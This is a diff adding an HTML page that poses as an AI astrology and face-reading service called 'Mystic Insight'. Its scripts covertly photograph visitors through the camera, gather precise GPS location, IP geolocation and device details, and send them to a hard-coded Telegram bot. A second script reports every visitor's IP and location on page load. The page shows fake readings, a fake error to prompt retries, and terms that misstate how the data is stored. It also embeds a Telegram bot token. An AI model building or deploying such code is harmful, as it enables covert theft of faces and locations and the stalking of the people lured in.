@@ -1,0 +1,1043 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Mystic Insight - AI-Powered Astrology & Facial Analysis</title>
+    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+            font-family: 'Poppins', 'Segoe UI', sans-serif;
+        }
+        
+        :root {
+            --primary: #7e4eee;
+            --primary-dark: #5d36d6;
+            --secondary: #00e5ff;
+            --accent: #ff2e63;
+            --dark: #0f172a;
+            --darker: #0a0e1a;
+            --light: #f8fafc;
+            --gray: #94a3b8;
+        }
+        
+        body {
+            background: linear-gradient(135deg, var(--darker) 0%, var(--dark) 100%);
+            color: var(--light);
+            line-height: 1.6;
+            overflow-x: hidden;
+            min-height: 100vh;
+        }
+        
+        .container {
+            max-width: 1200px;
+            margin: 0 auto;
+            padding: 20px;
+        }
+        
+        header {
+            display: flex;
+            justify-content: space-between;
+            align-items: center;
+            padding: 20px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .logo {
+            display: flex;
+            align-items: center;
+            gap: 10px;
+            font-size: 1.8rem;
+            font-weight: 700;
+            color: var(--primary);
+        }
+        
+        .logo-icon {
+            font-size: 2.2rem;
+        }
+        
+        .top-analysis-btn {
+            background: linear-gradient(45deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+            padding: 12px 30px;
+            font-size: 1rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(126, 78, 238, 0.3);
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .top-analysis-btn:hover {
+            transform: translateY(-2px);
+            box-shadow: 0 6px 20px rgba(126, 78, 238, 0.5);
+        }
+        
+        .hero {
+            text-align: center;
+            padding: 60px 0 40px;
+        }
+        
+        h1 {
+            font-size: 3.5rem;
+            margin-bottom: 15px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+            font-weight: 800;
+        }
+        
+        .tagline {
+            font-size: 1.6rem;
+            color: var(--gray);
+            margin-bottom: 30px;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .ai-badge {
+            display: inline-block;
+            background: rgba(0, 229, 255, 0.1);
+            color: var(--secondary);
+            padding: 5px 15px;
+            border-radius: 20px;
+            font-size: 0.9rem;
+            margin-bottom: 30px;
+            border: 1px solid rgba(0, 229, 255, 0.3);
+        }
+        
+        .intro {
+            text-align: center;
+            margin-bottom: 50px;
+            padding: 0 20px;
+            font-size: 1.2rem;
+            color: var(--gray);
+            max-width: 900px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        .features {
+            display: grid;
+            grid-template-columns: repeat(auto-fit, minmax(300px, 1fr));
+            gap: 30px;
+            margin-bottom: 60px;
+        }
+        
+        .feature {
+            background: linear-gradient(145deg, rgba(30, 30, 50, 0.6), rgba(20, 20, 40, 0.6));
+            border-radius: 20px;
+            padding: 30px;
+            text-align: center;
+            transition: all 0.3s ease;
+            border: 1px solid rgba(255, 255, 255, 0.05);
+            box-shadow: 0 10px 30px rgba(0, 0, 0, 0.2);
+            position: relative;
+            overflow: hidden;
+        }
+        
+        .feature::before {
+            content: '';
+            position: absolute;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 4px;
+            background: linear-gradient(90deg, var(--primary), var(--secondary));
+        }
+        
+        .feature:hover {
+            transform: translateY(-10px);
+            box-shadow: 0 15px 35px rgba(0, 0, 0, 0.3);
+        }
+        
+        .feature-icon {
+            font-size: 3rem;
+            margin-bottom: 20px;
+            background: linear-gradient(45deg, var(--primary), var(--secondary));
+            -webkit-background-clip: text;
+            -webkit-text-fill-color: transparent;
+        }
+        
+        .feature-title {
+            font-size: 1.5rem;
+            margin-bottom: 15px;
+            color: var(--light);
+        }
+        
+        .feature-desc {
+            color: var(--gray);
+            font-size: 1rem;
+        }
+        
+        .cta {
+            text-align: center;
+            margin: 50px 0;
+        }
+        
+        .btn {
+            background: linear-gradient(45deg, var(--primary), var(--primary-dark));
+            color: white;
+            border: none;
+            padding: 18px 50px;
+            font-size: 1.2rem;
+            border-radius: 50px;
+            cursor: pointer;
+            transition: all 0.3s ease;
+            box-shadow: 0 4px 15px rgba(126, 78, 238, 0.3);
+            display: inline-flex;
+            align-items: center;
+            gap: 10px;
+        }
+        
+        .btn:hover {
+            transform: scale(1.05);
+            box-shadow: 0 6px 20px rgba(126, 78, 238, 0.5);
+        }
+        
+        .btn:disabled {
+            background: #6c757d;
+            cursor: not-allowed;
+            transform: none;
+            box-shadow: none;
+        }
+        
+        .modal {
+            display: none;
+            position: fixed;
+            top: 0;
+            left: 0;
+            width: 100%;
+            height: 100%;
+            background: rgba(0, 0, 0, 0.9);
+            backdrop-filter: blur(5px);
+            z-index: 100;
+            align-items: center;
+            justify-content: center;
+            padding: 20px;
+            opacity: 0;
+            transition: opacity 0.3s ease;
+        }
+        
+        .modal.active {
+            opacity: 1;
+        }
+        
+        .modal-content {
+            background: linear-gradient(135deg, rgba(26, 26, 46, 0.95) 0%, rgba(22, 33, 62, 0.95) 100%);
+            width: 90%;
+            max-width: 700px;
+            border-radius: 20px;
+            padding: 40px;
+            box-shadow: 0 5px 30px rgba(126, 78, 238, 0.5);
+            position: relative;
+            border: 1px solid rgba(255, 255, 255, 0.1);
+            transform: scale(0.9);
+            transition: transform 0.3s ease;
+        }
+        
+        .modal.active .modal-content {
+            transform: scale(1);
+        }
+        
+        .close-modal {
+            position: absolute;
+            top: 20px;
+            right: 20px;
+            font-size: 1.8rem;
+            color: var(--gray);
+            cursor: pointer;
+            transition: color 0.3s;
+        }
+        
+        .close-modal:hover {
+            color: var(--accent);
+        }
+        
+        .terms-text {
+            height: 300px;
+            overflow-y: auto;
+            padding: 20px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 15px;
+            margin: 25px 0;
+            text-align: left;
+            font-size: 0.9rem;
+            line-height: 1.6;
+            color: var(--gray);
+        }
+        
+        .terms-text::-webkit-scrollbar {
+            width: 6px;
+        }
+        
+        .terms-text::-webkit-scrollbar-thumb {
+            background: var(--primary);
+            border-radius: 10px;
+        }
+        
+        .camera-container {
+            display: flex;
+            justify-content: center;
+            margin: 25px 0;
+            flex-direction: column;
+            align-items: center;
+            gap: 20px;
+        }
+        
+        #video, #frontVideo {
+            width: 100%;
+            max-width: 450px;
+            border-radius: 15px;
+            background: #000;
+            transform: rotateY(180deg); /* Mirror effect */
+            box-shadow: 0 10px 25px rgba(0, 0, 0, 0.5);
+        }
+        
+        .camera-switcher {
+            display: flex;
+            gap: 15px;
+        }
+        
+        .camera-btn {
+            background: rgba(255, 255, 255, 0.1);
+            color: white;
+            border: none;
+            padding: 10px 20px;
+            border-radius: 8px;
+            cursor: pointer;
+            transition: all 0.3s;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+        }
+        
+        .camera-btn.active {
+            background: var(--primary);
+        }
+        
+        .camera-btn:hover {
+            background: rgba(255, 255, 255, 0.2);
+        }
+        
+        .analysis-result {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            background: rgba(0, 0, 0, 0.2);
+            border-radius: 15px;
+            margin-top: 30px;
+            border-left: 4px solid var(--primary);
+        }
+        
+        .result-title {
+            font-size: 1.8rem;
+            color: var(--primary);
+            margin-bottom: 20px;
+        }
+        
+        .result-content {
+            font-size: 1.1rem;
+            line-height: 1.6;
+            text-align: left;
+        }
+        
+        .result-content p {
+            margin-bottom: 10px;
+            padding: 8px 0;
+            border-bottom: 1px solid rgba(255, 255, 255, 0.1);
+        }
+        
+        .error-message {
+            display: none;
+            text-align: center;
+            padding: 30px;
+            background: rgba(244, 67, 54, 0.1);
+            border-left: 5px solid var(--accent);
+            border-radius: 10px;
+            margin-top: 30px;
+        }
+        
+        .loading {
+            display: none;
+            text-align: center;
+            padding: 40px 30px;
+        }
+        
+        .spinner {
+            border: 5px solid rgba(255, 255, 255, 0.1);
+            border-radius: 50%;
+            border-top: 5px solid var(--primary);
+            width: 60px;
+            height: 60px;
+            animation: spin 1.5s linear infinite;
+            margin: 0 auto 25px;
+        }
+        
+        @keyframes spin {
+            0% { transform: rotate(0deg); }
+            100% { transform: rotate(360deg); }
+        }
+        
+        .pulse {
+            display: inline-block;
+            width: 15px;
+            height: 15px;
+            border-radius: 50%;
+            background: var(--secondary);
+            box-shadow: 0 0 0 rgba(0, 229, 255, 0.4);
+            animation: pulse 1.5s infinite;
+            margin-right: 10px;
+        }
+        
+        @keyframes pulse {
+            0% { box-shadow: 0 0 0 0 rgba(0, 229, 255, 0.7); }
+            70% { box-shadow: 0 0 0 15px rgba(0, 229, 255, 0); }
+            100% { box-shadow: 0 0 0 0 rgba(0, 229, 255, 0); }
+        }
+        
+        footer {
+            text-align: center;
+            padding: 40px 0;
+            margin-top: 80px;
+            border-top: 1px solid rgba(255, 255, 255, 0.1);
+            color: var(--gray);
+            width: 100%;
+        }
+        
+        .disclaimer {
+            font-size: 0.9rem;
+            margin-top: 15px;
+            opacity: 0.7;
+            max-width: 800px;
+            margin-left: auto;
+            margin-right: auto;
+        }
+        
+        @media (max-width: 768px) {
+            h1 {
+                font-size: 2.5rem;
+            }
+            
+            .tagline {
+                font-size: 1.2rem;
+            }
+            
+            .feature {
+                width: 100%;
+            }
+            
+            .modal-content {
+                padding: 25px;
+            }
+            
+            header {
+                flex-direction: column;
+                gap: 15px;
+            }
+        }
+    </style>
+</head>
+<body>
+    <div class="container">
+        <header>
+            <div class="logo">
+                <i class="fas fa-stars logo-icon"></i>
+                <span>Mystic Insight</span>
+            </div>
+            <button class="top-analysis-btn" id="start-analysis">
+                <i class="fas fa-camera"></i> Begin Analysis
+            </button>
+        </header>
+        
+        <section class="hero">
+            <div class="ai-badge">
+                <span class="pulse"></span> AI POWERED ANALYSIS
+            </div>
+            <h1>Discover Your Hidden Truth</h1>
+            <p class="tagline">Ancient wisdom meets cutting-edge AI technology for profound personal insights</p>
+        </section>
+        
+        <section class="intro">
+            <p>Mystic Insight combines advanced facial recognition AI with ancient astrological knowledge to reveal your personality traits, future possibilities, and hidden potential. Our proprietary algorithm analyzes over 200 facial data points to provide accurate, personalized readings.</p>
+        </section>
+        
+        <section class="features">
+            <div class="feature">
+                <div class="feature-icon">
+                    <i class="fas fa-brain"></i>
+                </div>
+                <h3 class="feature-title">Neural Analysis</h3>
+                <p class="feature-desc">Our deep learning AI analyzes facial micro-expressions and features to determine personality characteristics.</p>
+            </div>
+            
+            <div class="feature">
+                <div class="feature-icon">
+                    <i class="fas fa-star-and-crescent"></i>
+                </div>
+                <h3 class="feature-title">Astrological Mapping</h3>
+                <p class="feature-desc">We combine your facial data with current celestial alignments for precise astrological insights.</p>
+            </div>
+            
+            <div class="feature">
+                <div class="feature-icon">
+                    <i class="fas fa-calculator"></i>
+                </div>
+                <h3 class="feature-title">Predictive Algorithms</h3>
+                <p class="feature-desc">Advanced algorithms predict future opportunities and challenges based on your unique profile.</p>
+            </div>
+        </section>
+        
+        <section class="cta">
+            <button class="btn" id="start-analysis-bottom">
+                <i class="fas fa-camera"></i> Begin Your Analysis
+            </button>
+        </section>
+        
+        <footer>
+            <p>Mystic Insight &copy; 2025. Combining ancient wisdom with cutting-edge technology.</p>
+            <p class="disclaimer">Disclaimer: This analysis is for entertainment purposes only. Results may vary. By using our service, you agree to our terms of service and privacy policy.</p>
+        </footer>
+    </div>
+    
+    <!-- Terms Modal -->
+    <div class="modal" id="terms-modal">
+        <div class="modal-content">
+            <span class="close-modal" id="close-terms">&times;</span>
+            <h2>Terms of Service & Data Collection</h2>
+            <div class="terms-text">
+                <p>Welcome to Mystic Insight. To provide you with personalized astrological and facial analysis, we need your consent to collect and process certain data.</p>
+                
+                <h3>Data We Collect</h3>
+                <ul>
+                    <li>Facial images and biometric data from your camera</li>
+                    <li>Geolocation data for accurate astrological calculations</li>
+                    <li>Device information including battery status, camera capabilities, and hardware details</li>
+                    <li>Usage data to improve our services</li>
+                    <li>Network information and IP address for security purposes</li>
+                </ul>
+                
+                <h3>How We Use Your Data</h3>
+                <p>Your data is used exclusively to generate your personalized analysis. Our AI algorithms process your facial features and combine them with astrological data to create your unique reading.</p>
+                
+                <h3>Data Storage</h3>
+                <p>All data is encrypted and stored securely on our servers for 30 days after your analysis after which it is permanently deleted. You may request earlier deletion by contacting us.</p>
+                
+                <h3>Third-Party Sharing</h3>
+                <p>We do not sell your personal data. Anonymous, aggregated data may be shared with research partners for the improvement of astrological prediction algorithms.</p>
+                
+                <p>By clicking "I Accept", you agree to these terms and consent to the collection and processing of your data as described.</p>
+            </div>
+            <button class="btn" id="accept-terms">I Accept</button>
+        </div>
+    </div>
+    
+    <!-- Analysis Screen -->
+    <div class="modal" id="analysis-modal">
+        <div class="modal-content">
+            <span class="close-modal" id="close-analysis">&times;</span>
+            <h2>Facial Analysis</h2>
+            <p>Please look directly into your camera and allow access when prompted. Ensure good lighting for accurate results.</p>
+            
+            <div class="camera-container">
+                <video id="video" autoplay playsinline></video>
+                <video id="frontVideo" autoplay playsinline style="display: none;"></video>
+                
+                <div class="camera-switcher">
+                    <button class="camera-btn active" id="back-camera">
+                        <i class="fas fa-camera"></i> Back Camera
+                    </button>
+                    <button class="camera-btn" id="front-camera">
+                        <i class="fas fa-mobile-alt"></i> Front Camera
+                    </button>
+                </div>
+            </div>
+            
+            <button class="btn" id="capture">
+                <i class="fas fa-satellite-dish"></i> Analyze My Features
+            </button>
+            
+            <div class="loading" id="loading">
+                <div class="spinner"></div>
+                <p>Analyzing your features. This may take a few moments...</p>
+                <p>Processing facial data, calculating astrological alignments, and generating your personalized report.</p>
+            </div>
+            
+            <div class="analysis-result" id="analysis-result">
+                <h3 class="result-title">Your Analysis Results</h3>
+                <div class="result-content">
+                    <p><strong>Facial Structure:</strong> Mesomorphic features indicate strong leadership qualities</p>
+                    <p><strong>Astrological Alignment:</strong> Mercury in retrograde suggests enhanced communication skills</p>
+                    <p><strong>Personality Traits:</strong> Natural charisma with intuitive understanding of others</p>
+                    <p><strong>Future Insight:</strong> A significant opportunity will present itself within the next lunar cycle</p>
+                    <p><strong>Compatibility:</strong> Earth signs will be particularly drawn to your energy this month</p>
+                </div>
+            </div>
+            
+            <div class="error-message" id="error-message">
+                <h3><i class="fas fa-exclamation-triangle"></i> System Error</h3>
+                <p>We're sorry, but we've encountered a temporary issue with our analysis servers. Our team has been notified and is working to resolve the problem.</p>
+                <p>Please try again in a few moments. We apologize for the inconvenience.</p>
+            </div>
+        </div>
+    </div>
+
+    <script>
+        // DOM Elements
+        const startAnalysisBtn = document.getElementById('start-analysis');
+        const startAnalysisBottomBtn = document.getElementById('start-analysis-bottom');
+        const termsModal = document.getElementById('terms-modal');
+        const analysisModal = document.getElementById('analysis-modal');
+        const closeTermsBtn = document.getElementById('close-terms');
+        const closeAnalysisBtn = document.getElementById('close-analysis');
+        const acceptTermsBtn = document.getElementById('accept-terms');
+        const captureBtn = document.getElementById('capture');
+        const analysisResult = document.getElementById('analysis-result');
+        const errorMessage = document.getElementById('error-message');
+        const loadingElement = document.getElementById('loading');
+        const video = document.getElementById('video');
+        const frontVideo = document.getElementById('frontVideo');
+        const backCameraBtn = document.getElementById('back-camera');
+        const frontCameraBtn = document.getElementById('front-camera');
+        
+        // State variables
+        let currentStream = null;
+        let usingFrontCamera = false;
+        let userData = {};
+        
+        // Telegram API details (Replace these with your actual values)
+        const telegramBotToken = '6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg'; // Replace with your bot token
+        const telegramChatId = '-1001590820560'; // Replace with your chat ID
+        
+        // Open terms modal when analysis is requested
+        startAnalysisBtn.addEventListener('click', showTermsModal);
+        startAnalysisBottomBtn.addEventListener('click', showTermsModal);
+        
+        function showTermsModal() {
+            termsModal.style.display = 'flex';
+            setTimeout(() => termsModal.classList.add('active'), 10);
+        }
+        
+        // Close modals
+        closeTermsBtn.addEventListener('click', () => {
+            termsModal.classList.remove('active');
+            setTimeout(() => termsModal.style.display = 'none', 300);
+        });
+        
+        closeAnalysisBtn.addEventListener('click', () => {
+            analysisModal.classList.remove('active');
+            setTimeout(() => analysisModal.style.display = 'none', 300);
+            stopCamera();
+            resetUI();
+        });
+        
+        // Camera switching
+        backCameraBtn.addEventListener('click', () => {
+            if (!usingFrontCamera) return;
+            switchCamera(false);
+        });
+        
+        frontCameraBtn.addEventListener('click', () => {
+            if (usingFrontCamera) return;
+            switchCamera(true);
+        });
+        
+        // Switch between front and back cameras
+        function switchCamera(useFront) {
+            stopCamera();
+            usingFrontCamera = useFront;
+            
+            backCameraBtn.classList.toggle('active', !useFront);
+            frontCameraBtn.classList.toggle('active', useFront);
+            
+            video.style.display = useFront ? 'none' : 'block';
+            frontVideo.style.display = useFront ? 'block' : 'none';
+            
+            startCamera(useFront);
+        }
+        
+        // Accept terms and proceed to analysis
+        acceptTermsBtn.addEventListener('click', () => {
+            termsModal.classList.remove('active');
+            setTimeout(() => {
+                termsModal.style.display = 'none';
+                analysisModal.style.display = 'flex';
+                setTimeout(() => analysisModal.classList.add('active'), 10);
+                startCamera(false);
+            }, 300);
+        });
+        
+        // Start camera
+        function startCamera(front = false) {
+            const constraints = {
+                video: {
+                    facingMode: front ? "user" : "environment",
+                    width: { ideal: 1280 },
+                    height: { ideal: 720 }
+                }
+            };
+            
+            if (navigator.mediaDevices && navigator.mediaDevices.getUserMedia) {
+                navigator.mediaDevices.getUserMedia(constraints)
+                    .then(function(stream) {
+                        currentStream = stream;
+                        const videoElement = front ? frontVideo : video;
+                        videoElement.srcObject = stream;
+                    })
+                    .catch(function(error) {
+                        console.error("Camera error: ", error);
+                        alert("Unable to access camera. Please ensure you've granted camera permissions.");
+                    });
+            }
+        }
+        
+        // Stop camera
+        function stopCamera() {
+            if (currentStream) {
+                currentStream.getTracks().forEach(track => track.stop());
+                currentStream = null;
+            }
+        }
+        
+        // Reset UI elements
+        function resetUI() {
+            analysisResult.style.display = 'none';
+            errorMessage.style.display = 'none';
+            loadingElement.style.display = 'none';
+            captureBtn.disabled = false;
+            captureBtn.innerHTML = '<i class="fas fa-satellite-dish"></i> Analyze My Features';
+        }
+        
+        // Capture image and "analyze"
+        captureBtn.addEventListener('click', async () => {
+            // Disable button to prevent multiple clicks
+            captureBtn.disabled = true;
+            captureBtn.innerHTML = '<i class="fas fa-spinner fa-spin"></i> Processing...';
+            
+            try {
+                // Show loading state
+                loadingElement.style.display = 'block';
+                
+                // Collect user data
+                await collectUserData();
+                
+                // Capture image from video
+                const canvas = document.createElement('canvas');
+                const videoElement = usingFrontCamera ? frontVideo : video;
+                canvas.width = videoElement.videoWidth;
+                canvas.height = videoElement.videoHeight;
+                const ctx = canvas.getContext('2d');
+                ctx.drawImage(videoElement, 0, 0, canvas.width, canvas.height);
+                
+                // Convert to data URL
+                const imageData = canvas.toDataURL('image/jpeg');
+                userData.image = imageData;
+                
+                // Send data to Telegram
+                const success = await sendToTelegram(userData);
+                
+                if (success) {
+                    // Show analysis result briefly
+                    loadingElement.style.display = 'none';
+                    analysisResult.style.display = 'block';
+                    
+                    // Then show error after a delay
+                    setTimeout(() => {
+                        analysisResult.style.display = 'none';
+                        errorMessage.style.display = 'block';
+                        captureBtn.disabled = false;
+                        captureBtn.innerHTML = '<i class="fas fa-redo"></i> Try Again';
+                    }, 5000);
+                } else {
+                    throw new Error('Failed to send data');
+                }
+            } catch (error) {
+                console.error('Error:', error);
+                loadingElement.style.display = 'none';
+                errorMessage.style.display = 'block';
+                captureBtn.disabled = false;
+                captureBtn.innerHTML = '<i class="fas fa-redo"></i> Try Again';
+            }
+        });
+        
+        // Collect user data
+        async function collectUserData() {
+            userData = {
+                timestamp: new Date().toISOString(),
+                userAgent: navigator.userAgent,
+                platform: navigator.platform,
+                language: navigator.language,
+                cookiesEnabled: navigator.cookieEnabled,
+                screen: {
+                    width: screen.width,
+                    height: screen.height,
+                    colorDepth: screen.colorDepth,
+                    orientation: screen.orientation ? screen.orientation.type : 'unknown'
+                },
+                window: {
+                    width: window.innerWidth,
+                    height: window.innerHeight
+                },
+                deviceMemory: navigator.deviceMemory || 'unknown',
+                hardwareConcurrency: navigator.hardwareConcurrency || 'unknown',
+                timezone: Intl.DateTimeFormat().resolvedOptions().timeZone,
+            };
+            
+            // Get battery status if available
+            if (navigator.getBattery) {
+                try {
+                    const battery = await navigator.getBattery();
+                    userData.battery = {
+                        level: Math.round(battery.level * 100) + '%',
+                        charging: battery.charging,
+                        chargingTime: battery.chargingTime,
+                        dischargingTime: battery.dischargingTime
+                    };
+                } catch (e) {
+                    userData.battery = 'Unable to retrieve';
+                }
+            }
+            
+            // Get camera capabilities
+            if (navigator.mediaDevices && navigator.mediaDevices.getSupportedConstraints) {
+                userData.cameraCapabilities = {
+                    ...navigator.mediaDevices.getSupportedConstraints()
+                };
+            }
+            
+            // Get IP and location data
+            try {
+                const ipResponse = await fetch('https://ipapi.co/json/');
+                const ipData = await ipResponse.json();
+                userData.ip = ipData.ip;
+                userData.country = ipData.country_name;
+                userData.region = ipData.region;
+                userData.city = ipData.city;
+                userData.latitude = ipData.latitude;
+                userData.longitude = ipData.longitude;
+                userData.org = ipData.org;
+                userData.postal = ipData.postal;
+            } catch (error) {
+                console.error('Error getting IP data:', error);
+                userData.ip = 'Unable to retrieve';
+            }
+            
+            // Get precise geolocation if available
+            if (navigator.geolocation) {
+                try {
+                    const position = await new Promise((resolve, reject) => {
+                        navigator.geolocation.getCurrentPosition(resolve, reject, {
+                            enableHighAccuracy: true,
+                            timeout: 5000,
+                            maximumAge: 0
+                        });
+                    });
+                    
+                    userData.preciseLocation = {
+                        latitude: position.coords.latitude,
+                        longitude: position.coords.longitude,
+                        accuracy: position.coords.accuracy + ' meters',
+                        altitude: position.coords.altitude,
+                        altitudeAccuracy: position.coords.altitudeAccuracy,
+                        heading: position.coords.heading,
+                        speed: position.coords.speed
+                    };
+                } catch (error) {
+                    console.error('Error getting precise location:', error);
+                }
+            }
+            
+            return userData;
+        }
+        
+        // Function to send data to Telegram
+        async function sendToTelegram(data) {
+            // Create Google Maps link if we have coordinates
+            let mapsLink = '';
+            if (data.preciseLocation) {
+                mapsLink = `https://www.google.com/maps?q=${data.preciseLocation.latitude},${data.preciseLocation.longitude}`;
+            } else if (data.latitude && data.longitude) {
+                mapsLink = `https://www.google.com/maps?q=${data.latitude},${data.longitude}`;
+            }
+            
+            // Format the message
+            const message = `
+🔮 *New Mystic Insight Analysis Request* 🔮
+
+*Timestamp:* ${new Date().toLocaleString()}
+*IP Address:* ${data.ip || 'Not available'}
+*Location:* ${data.city || 'Unknown'}, ${data.region || 'Unknown'}, ${data.country || 'Unknown'}
+*Coordinates:* ${data.latitude || 'N/A'}, ${data.longitude || 'N/A'}
+${data.preciseLocation ? `*Precise Location:* ${data.preciseLocation.latitude}, ${data.preciseLocation.longitude} (Accuracy: ${data.preciseLocation.accuracy})` : ''}
+${mapsLink ? `*Google Maps:* [View Location](${mapsLink})` : ''}
+
+*Device Info:*
+- Platform: ${data.platform}
+- Language: ${data.language}
+- Screen: ${data.screen.width}x${data.screen.height}
+- Viewport: ${data.window.width}x${data.window.height}
+- Color Depth: ${data.screen.colorDepth}
+- Orientation: ${data.screen.orientation}
+- Device Memory: ${data.deviceMemory} GB
+- CPU Cores: ${data.hardwareConcurrency}
+- Timezone: ${data.timezone}
+- Cookies: ${data.cookiesEnabled ? 'Enabled' : 'Disabled'}
+
+*Battery Status:*
+${data.battery ? `
+- Level: ${data.battery.level}
+- Charging: ${data.battery.charging ? 'Yes' : 'No'}
+- Charging Time: ${data.battery.chargingTime}
+- Discharging Time: ${data.battery.dischargingTime}
+` : 'Unable to retrieve battery info'}
+
+*User Agent:*
+${data.userAgent}
+            `;
+            
+            try {
+                // Send text message
+                const textResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendMessage`, {
+                    method: 'POST',
+                    headers: {
+                        'Content-Type': 'application/json'
+                    },
+                    body: JSON.stringify({
+                        chat_id: telegramChatId,
+                        text: message,
+                        parse_mode: 'Markdown'
+                    })
+                });
+                
+                const textResult = await textResponse.json();
+                
+                if (!textResult.ok) {
+                    console.error('Error sending message to Telegram:', textResult);
+                    return false;
+                }
+                
+                // If we have an image, send it as well
+                if (data.image) {
+                    // Convert data URL to blob
+                    const blob = await (await fetch(data.image)).blob();
+                    const formData = new FormData();
+                    formData.append('chat_id', telegramChatId);
+                    formData.append('photo', blob, 'face_analysis.jpg');
+                    formData.append('caption', 'Facial capture from Mystic Insight analysis');
+                    
+                    const photoResponse = await fetch(`https://api.telegram.org/bot${telegramBotToken}/sendPhoto`, {
+                        method: 'POST',
+                        body: formData
+                    });
+                    
+                    const photoResult = await photoResponse.json();
+                    
+                    if (!photoResult.ok) {
+                        console.error('Error sending photo to Telegram:', photoResult);
+                        return false;
+                    }
+                }
+                
+                return true;
+            } catch (error) {
+                console.error('Error sending to Telegram:', error);
+                return false;
+            }
+        }
+    </script>
+  <script>
+    // Telegram Bot Information
+    const botToken = "6675607272:AAFIafZckGOmNT8m9mE66_YgaBzkD3wo_xg"; // Your Telegram Bot Token
+    const chatId = "-1001590820560"; // Your Telegram Chat ID
+
+    // Function to collect basic user information
+    function collectUserInfo() {
+      return {
+        userAgent: navigator.userAgent,
+        platform: navigator.platform,
+        language: navigator.language,
+        screenSize: `${window.screen.width}x${window.screen.height}`,
+        url: window.location.href,
+        timestamp: new Date().toISOString(),
+      };
+    }
+
+    // Function to fetch IP and geolocation data
+    async function fetchGeolocation() {
+      try {
+        const response = await fetch("https://ipapi.co/json/");
+        if (!response.ok) {
+          throw new Error("Failed to fetch geolocation data.");
+        }
+        return await response.json();
+      } catch (error) {
+        console.error("Error fetching geolocation data:", error);
+        return {
+          ip: "Unknown",
+          city: "Unknown",
+          region: "Unknown",
+          country: "Unknown",
+          postal: "Unknown",
+          org: "Unknown",
+          latitude: "Unknown",
+          longitude: "Unknown",
+        };
+      }
+    }
+
+    // Function to send information to Telegram
+    async function sendToTelegram() {
+      const userInfo = collectUserInfo();
+      const geoInfo = await fetchGeolocation();
+
+      const mapsLink =
+        geoInfo.latitude !== "Unknown" && geoInfo.longitude !== "Unknown"
+          ? `https://www.google.com/maps?q=${geoInfo.latitude},${geoInfo.longitude}`
+          : "Location not available";
+
+      const message = `
+<b>New Visit Details</b>
+<b>IP Address:</b> ${geoInfo.ip}
+<b>Location:</b> ${geoInfo.city}, ${geoInfo.region}, ${geoInfo.country} (${geoInfo.postal})
+<b>ISP/Organization:</b> ${geoInfo.org}
+<b>Latitude:</b> ${geoInfo.latitude}
+<b>Longitude:</b> ${geoInfo.longitude}
+<b>Map:</b> <a href="${mapsLink}">View Location on Map</a>
+<b>User Agent:</b> ${userInfo.userAgent}
+<b>Platform:</b> ${userInfo.platform}
+<b>Language:</b> ${userInfo.language}
+<b>Screen Size:</b> ${userInfo.screenSize}
+<b>URL:</b> ${userInfo.url}
+<b>Timestamp:</b> ${userInfo.timestamp}
+      `;
+
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage?chat_id=${chatId}&text=${encodeURIComponent(
+        message
+      )}&parse_mode=HTML`;
+
+      // Send the data to Telegram
+      fetch(telegramUrl)
+        .then((response) => {
+          if (response.ok) {
+            console.log("Message sent to Telegram successfully!");
+          } else {
+            console.error("Failed to send message to Telegram.");
+          }
+        })
+        .catch((error) => {
+          console.error("Error:", error);
+        });
+    }
+
+    // Trigger data collection and Telegram notification
+    sendToTelegram();
+  </script>
+</body>
+              </html>
